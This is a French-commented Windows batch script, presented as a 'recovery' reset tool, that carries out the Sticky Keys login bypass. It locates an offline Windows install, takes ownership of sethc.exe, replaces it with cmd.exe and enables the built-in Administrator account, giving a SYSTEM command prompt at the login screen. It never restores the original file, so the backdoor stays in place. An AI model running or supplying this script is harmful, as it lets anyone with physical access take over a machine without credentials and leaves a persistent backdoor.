@echo off
setlocal

REM ══════════════════════════════════════
REM  SUPER NOVA RECOVERY — Reset Script
REM ══════════════════════════════════════

REM 1. Trouver la partition Windows
for %%d in (C D E F G H) do (
    if exist "%%d:\Windows\System32\config\SAM" (
        set WINDRIVE=%%d
        goto :FOUND
    )
)
echo Partition Windows introuvable.
goto :EOF

:FOUND
echo Windows trouve sur %WINDRIVE%:\

REM 2. Prendre possession de sethc.exe
takeown /f "%WINDRIVE%:\Windows\System32\sethc.exe" >nul 2>&1
icacls "%WINDRIVE%:\Windows\System32\sethc.exe" /grant Administrateurs:F >nul 2>&1
icacls "%WINDRIVE%:\Windows\System32\sethc.exe" /grant Administrators:F >nul 2>&1

REM 3. Sauvegarder sethc.exe
if exist "%WINDRIVE%:\Windows\System32\sethcold.exe" (
    echo sethc.exe deja remplace, on continue.
    goto :REPLACE_DONE
)
ren "%WINDRIVE%:\Windows\System32\sethc.exe" sethcold.exe
if errorlevel 1 (
    echo ERREUR : Impossible de renommer sethc.exe
    goto :EOF
)
echo sethc.exe sauvegarde en sethcold.exe

REM 3. Remplacer sethc.exe par cmd.exe
:REPLACE_DONE
copy /Y "%WINDRIVE%:\Windows\System32\cmd.exe" "%WINDRIVE%:\Windows\System32\sethc.exe"
if errorlevel 1 (
    echo ERREUR : Impossible de copier cmd.exe
    goto :EOF
)
echo cmd.exe copie vers sethc.exe

REM 4. Activer le compte Administrateur integre
net user administrateur /active:yes >nul 2>&1
if errorlevel 1 (
    net user administrator /active:yes >nul 2>&1
)
echo Compte Administrateur active

echo.
echo Operation terminee !
echo Retirez la cle USB et redemarrez.
echo Sur l'ecran de login, appuyez 5x sur Maj pour ouvrir un CMD.

endlocal
pause